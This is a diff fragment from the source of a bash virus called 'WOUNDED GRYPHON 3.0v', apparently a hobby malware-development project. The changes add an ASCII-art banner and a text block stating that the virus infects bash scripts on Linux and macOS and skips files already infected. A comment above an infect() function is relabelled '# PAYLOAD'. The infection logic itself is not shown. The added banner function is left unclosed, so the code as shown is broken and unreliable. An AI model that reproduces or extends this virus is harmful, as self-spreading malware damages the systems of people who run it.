@@ -40,8 +40,42 @@ CAT=$(cat "$me")
 
 FLAG="#arrow"
 
-# Check if files are written in bash then start infecting them.
-# The virus ignores non bash scripts and already infected files
+# BANNER function
+function banner1() {
+   
+   echo "                _  #       _ "
+   echo "              _/|  \ _   |\_ "
+   echo "            _/_ |   \|\\ | _\ "
+   echo "          _/_/| /  /   \|\ |\_\_     # "
+   echo "        _/_/  |/  /  _  \/\|  \_\_  / "
+   echo "      _/_/    ||  | | \*/ ||    \_\/   "
+   echo "     /_/  | | |\  | \_ /  /| | |  \_\   # "
+   echo "    //    ||| | \_/   \__/ | |||    \\ / "
+   echo "   // __| ||\  \ ||    || /  /|| |__ \/ "
+   echo "  //_/ \|||| \/\\||    ||//\/ ||||/ \_\\ "
+   echo " ///    \\\\/   /()    ()\   \////    \\\ "
+   echo " |/      \/    |    |    |     \/      \| "
+   echo "              /_|  | |_  \  # "
+   echo "              ///_| |_||\_ \/ "
+   echo "              |//||/||\/||\/       WOUNDED GRYPHON 3.0v "
+   echo "               / || ||/||/\/    "
+   echo "                 {}/|| {}        "
+   echo "                    ||            "
+   echo "                    () "
+
+function banner_text() {
+   
+   echo "
+   
+   # Created by TheG0df2ther a MalDev101 project
+   # This is only an experiment but it can be dangerous.
+   # I am not responsible for the damage.
+   # This is a virus that works on unix systems with bash installed.
+   # Tested on Linux (Ubuntu, Debian) and MacOS (OSX)
+   
+   # Check if files are written in bash then start infecting them.
+   # The virus ignores non bash scripts and already infected files "
+
 
 function check() {
    
@@ -99,7 +133,8 @@ function foldercheck() {
       check
    fi
 
-# infect files
+
+# PAYLOAD
 
 function infect() {
    
